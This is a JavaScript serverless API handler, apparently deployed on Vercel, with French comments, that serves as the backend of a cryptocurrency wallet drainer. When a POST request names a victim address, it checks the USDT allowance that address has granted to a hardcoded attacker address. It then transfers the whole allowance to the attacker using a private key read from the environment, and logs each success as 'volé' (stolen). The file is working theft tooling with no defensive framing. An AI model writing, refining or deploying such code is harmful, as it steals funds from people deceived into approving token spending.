// Nécessite d'installer 'web3' via npm (dans le projet Vercel)
import Web3 from 'web3';

const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
const PRIVATE_KEY = process.env.ATTACKER_PRIVATE_KEY;

const TOKENS = {
  '1': {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7'
  }
};

const RPC_URLS = {
  '1': 'https://cloudflare-eth.com'
};

async function drainVictim(victimAddress, chainId) {
  const web3 = new Web3(new Web3.providers.HttpProvider(RPC_URLS[chainId]));
  if (!await web3.eth.net.isListening()) {
    console.error(`RPC ${chainId} non joignable`);
    return;
  }

  const tokens = TOKENS[chainId];
  for (const [tokenName, tokenAddress] of Object.entries(tokens)) {
    try {
      const tokenContract = new web3.eth.Contract(
        [
          {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
          {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
        ],
        tokenAddress
      );

      const allowance = await tokenContract.methods.allowance(victimAddress, ATTACKER_ADDRESS).call();
      if (allowance === '0') {
        console.log(`${tokenName} : allowance nulle, ignoré`);
        continue;
      }

      const nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
      const tx = {
        from: ATTACKER_ADDRESS,
        to: tokenAddress,
        data: tokenContract.methods.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance).encodeABI(),
        gas: 100000,
        gasPrice: await web3.eth.getGasPrice(),
        nonce
      };

      const signedTx = await web3.eth.accounts.signTransaction(tx, PRIVATE_KEY);
      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
      console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
    } catch (e) {
      console.error(`Erreur ${tokenName}: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 500));
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { victim, chain } = req.body;
    if (!victim) return res.status(400).json({ error: 'Adresse victime manquante' });

    // Lancer le drain en arrière-plan
    drainVictim(victim, chain || '1').catch(err => console.error('Drain error:', err));

    return res.status(200).json({ success: true, victim, chain });
  } else {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }
}